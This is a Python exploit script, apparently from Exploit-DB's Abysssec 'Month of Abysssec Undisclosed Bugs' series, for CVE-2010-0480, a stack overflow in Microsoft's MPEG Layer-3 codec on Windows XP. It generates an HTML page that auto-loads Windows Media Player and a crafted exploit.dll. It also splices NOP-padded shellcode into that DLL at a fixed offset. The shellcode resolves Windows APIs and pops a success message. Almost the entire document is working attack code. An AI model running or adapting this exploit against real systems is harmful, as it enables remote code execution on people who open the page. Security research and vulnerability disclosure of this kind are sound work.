'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ <  Day 5 (Binary Analysis)
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

 http://www.exploit-db.com/moaub-5-microsoft-mpeg-layer-3-audio-stack-based-overflow/
 https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/14895.zip (moaub-5-exploit.zip)

'''

'''
  Title               :  Microsoft MPEG Layer-3 Remote Command Execution Exploit
  Version             :  l3codeca.acm (XP SP2 / XP SP3)
  Analysis            :  http://www.abysssec.com
  Vendor              :  http://www.microsoft.com
  Impact              :  Ciritical
  Contact             :  shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter             :  @abysssec
  CVE                 :  CVE-2010-0480

'''

import sys
import struct
def main():
   
    try:
		strHTML = '''
		<html>
		<head>
		</head>
		<body>
		<object classID="exploit.dll#exploit.Shellcode"></object>
		<OBJECT ID="MediaPlayer" CLASSID="CLSID:22d6f312-b0f6-11d0-94ab-0080c74c7e95" CODEBASE="http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab# Version=5,1,52,701" STANDBY="Loading Microsoft Windows Media Player components..." TYPE="application/x-oleobject" width="280" height="46">
		<param name="fileName" value="test.avi">
		<param name="animationatStart" value="true">
		<param name="transparentatStart" value="true">
		<param name="autoStart" value="true">
		<param name="showControls" value="true">
		<param name="Volume" value="-300">
		<embed type="application/x-mplayer2" pluginspage="http://www.microsoft.com/Windows/MediaPlayer/" src="test.avi" name="MediaPlayer" width=280 height=46  autostart=1 showcontrols=1 volume=-300>
		</embed>
		</OBJECT>
		</body>
		</html> '''
		fHTML = open('index.html', 'w')
		fHTML.write(strHTML)
		fHTML.close()
		fdR = open('exploit.dll', 'rb+')
		strTotal = fdR.read()
		str1 = strTotal[:1380]
		str2 = strTotal[2115:]
		shellcode = '\xEB\x6B\x5A\x31\xC9\x6A\x10\x52\x42\x52\x51\xFF\xD0\x53\x68\x7E\xD8\xE2\x73\xFF\xD6\x6A\x00\xFF\xD0\xFF\xD7\x50\x68\xA8\xA2\x4D\xBC\xFF\xD6\xE8\xDA\xFF\xFF\xFF\x00\x54\x68\x65\x20\x65\x78\x70\x6C\x6F\x69\x74\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x21\x00\x5E\x6A\x30\x59\x64\x8B\x19\x8B\x5B\x0C\x8B\x5B\x1C\x8B\x1B\x8B\x5B\x08\x53\x68\x8E\x4E\x0E\xEC\xFF\xD6\x89\xC7\xE8\xB3\xFF\xFF\xFF\x55\x53\x45\x52\x33\x32\x00\xE8\xD3\xFF\xFF\xFF\x53\x55\x56\x57\x8B\x6C\x24\x18\x8B\x45\x3C\x8B\x54\x05\x78\x01\xEA\x8B\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x32\x49\x8B\x34\x8B\x01\xEE\x31\xFF\xFC\x31\xC0\xAC\x38\xE0\x74\x07\xC1\xCF\x0D\x01\xC7\xEB\xF2\x3B\x7C\x24\x14\x75\xE1\x8B\x5A\x24\x01\xEB\x66\x8B\x0C\x4B\x8B\x5A\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\xEB\x02\x31\xC0\x5F\x5E\x5D\x5B\xC2\x08\x00'
		
		if len(shellcode) > 735:
			print "[*] Error : Shellcode length is long"
			return
		if len(shellcode) <= 735:
			dif = 735 - len(shellcode)
			while dif > 0 :
				shellcode += '\x90'
				dif = dif - 1
		fdW= open('exploit.dll', 'wb+')
		fdW.write(str1)
		fdW.write(shellcode)
		fdW.write(str2)
		fdW.close()
		fdR.close()
		print '[-] Html file generated'
    except IOError:
        print '[*] Error : An IO error has occurred'
        print '[-] Exiting ...'
        sys.exit(-1)
                
if __name__ == '__main__':
    main()